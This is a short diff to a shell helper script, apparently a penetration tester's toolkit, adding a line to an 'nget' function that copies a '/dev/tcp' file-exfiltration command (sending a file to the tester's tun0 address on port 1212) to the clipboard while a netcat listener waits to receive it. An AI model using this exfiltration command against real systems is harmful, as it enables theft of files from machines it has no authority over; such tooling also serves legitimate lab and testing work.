@@ -328,6 +328,7 @@ ncl(){
 }
 
 nget(){
+    echo "cat $1 > /dev/tcp/$(ip addr show | grep 'global tun0' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')/1212"| xargs echo -n | DISPLAY=:0 xclip -sel clip
     echo "[command:] nc -lvnp 1212 > " $1
     nc -lvnp 1212 > $1
 }
